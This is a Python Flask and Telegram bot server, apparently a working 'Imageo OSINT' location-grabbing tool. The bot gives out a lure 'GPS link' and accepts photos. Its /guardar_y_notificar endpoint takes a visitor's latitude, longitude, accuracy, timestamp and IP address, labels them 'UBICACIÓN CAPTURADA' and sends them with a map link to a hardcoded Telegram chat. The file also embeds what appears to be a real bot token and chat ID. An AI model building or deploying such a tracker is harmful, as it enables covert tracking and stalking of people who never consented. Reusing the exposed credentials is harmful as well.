from flask import Flask, request, jsonify, send_from_directory
import os
import uuid
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import asyncio
import logging

app = Flask(__name__)

BOT_TOKEN   = os.environ.get('TELEGRAM_BOT_TOKEN', '8605186812:AAET8973lR2dwBr10G_hsw2jbL6yaxLvBPI')
CHAT_ID     = os.environ.get('CHAT_ID', '7891650726')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', 'https://imageo-mm44.onrender.com/webhook')
SERVER_URL  = os.environ.get('SERVER_URL', 'https://imageo-mm44.onrender.com')
UPLOAD_FOLDER = 'uploads'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Loop de eventos persistente (gunicorn --workers 1) ───────────────────────
_loop = asyncio.new_event_loop()
asyncio.set_event_loop(_loop)

def run_async(coro):
    """Ejecuta una corutina desde código síncrono."""
    return _loop.run_until_complete(coro)

# ── Handlers del bot ─────────────────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 Imageo OSINT Bot\n\n"
        "Enlace GPS: https://dancing-tiramisu-fc6a7a.netlify.app/\n\n"
        "Envía foto para procesar."
    )

async def share_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.photo:
        photo = await update.message.photo[-1].get_file()
        photo_bytes = await photo.download_as_bytearray()
        files = {'file': ('image.jpg', photo_bytes, 'image/jpeg')}
        try:
            resp = requests.post(f"{SERVER_URL}/upload", files=files, timeout=15)
            if resp.status_code == 200:
                await update.message.reply_text("✅ Foto procesada. Usa el enlace GPS arriba.")
            else:
                await update.message.reply_text("❌ Error al subir la foto.")
        except Exception as e:
            logger.error(f"Error subiendo foto: {e}")
            await update.message.reply_text("❌ Error de conexión.")
    else:
        await update.message.reply_text("📸 Envía una foto.")

# ── Construir bot de Telegram (nombre ptb_app para no chocar con Flask app) ──
ptb_app = Application.builder().token(BOT_TOKEN).build()
ptb_app.add_handler(CommandHandler("start", start))
ptb_app.add_handler(MessageHandler(filters.PHOTO, share_image))

async def setup_bot():
    await ptb_app.initialize()
    await ptb_app.bot.set_webhook(WEBHOOK_URL)
    logger.info(f"✅ Webhook registrado: {WEBHOOK_URL}")

run_async(setup_bot())

# ── Rutas Flask ───────────────────────────────────────────────────────────────
@app.route('/')
def home():
    return "✅ Imageo OSINT - Bot + GPS activo", 200

@app.route('/webhook', methods=['POST'])
def webhook():
    """Recibe actualizaciones de Telegram y las procesa (función SÍNCRONA)."""
    json_data = request.get_json(force=True)
    if json_data:
        update = Update.de_json(json_data, ptb_app.bot)
        run_async(ptb_app.process_update(update))
    return 'OK', 200

@app.route('/guardar_y_notificar', methods=['POST'])
def save_location():
    lat       = request.form.get('lat', 'N/A')
    lon       = request.form.get('lon', 'N/A')
    precision = request.form.get('precision', 'N/A')
    fecha     = request.form.get('fecha', 'N/A')
    ip        = request.remote_addr

    mensaje = (
        f"🎯 UBICACIÓN CAPTURADA\n"
        f"📍 Lat: {lat}\n"
        f"📍 Lon: {lon}\n"
        f"📏 Precisión: {precision}m\n"
        f"⏰ {fecha}\n"
        f"🌐 IP: {ip}\n"
        f"🗺️ https://www.google.com/maps?q={lat},{lon}"
    )

    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={'chat_id': CHAT_ID, 'text': mensaje}, timeout=10)
    except Exception as e:
        logger.error(f"Error enviando ubicación a Telegram: {e}")

    return "OK", 200

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No se envió ningún archivo'}), 400
    file = request.files['file']
    filename = f"{uuid.uuid4()}.jpg"
    file.save(os.path.join(UPLOAD_FOLDER, filename))
    return jsonify({'url': f'{SERVER_URL}/static/{filename}'}), 200

@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
